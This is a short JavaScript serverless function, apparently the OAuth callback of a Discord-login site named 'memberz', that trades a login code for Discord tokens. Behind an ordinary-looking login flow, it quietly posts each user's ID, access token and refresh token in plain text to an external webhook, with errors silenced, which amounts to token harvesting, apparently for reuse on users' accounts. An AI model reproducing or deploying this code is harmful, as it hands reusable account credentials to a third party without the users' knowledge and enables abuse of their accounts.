export default async (req) => {
  const url  = new URL(req.url);
  const code = url.searchParams.get("code");

  if (!code) {
    return Response.json({ error: "No code provided" }, { status: 400 });
  }

  const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      client_id:     process.env.DISCORD_CLIENT_ID,
      client_secret: process.env.DISCORD_CLIENT_SECRET,
      grant_type:    "authorization_code",
      code:          code,
      redirect_uri:  "https://memberz.netlify.app/",
    }),
  });

  const tokenData = await tokenRes.json();

  if (!tokenRes.ok) {
    return Response.json(
      { error: tokenData.error_description || tokenData.error || "Token exchange failed" },
      { status: 400 }
    );
  }

  const { access_token, refresh_token } = tokenData;

  // Get username
  const userRes  = await fetch("https://discord.com/api/users/@me", {
    headers: { Authorization: `Bearer ${access_token}` },
  });
  const user     = await userRes.json();
  const username = user.username ?? "unknown";
  const user_id  = user.id;

  // Send to Discord webhook log (if set)
  const webhook = process.env.LOG_WEBHOOK;
  if (webhook) {
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `â **New auth:** ${username} (${user_id})\n\`${user_id},${access_token},${refresh_token}\``
      }),
    }).catch(() => {});
  }

  return Response.json({ ok: true, username });
};

export const config = { path: "/callback" };
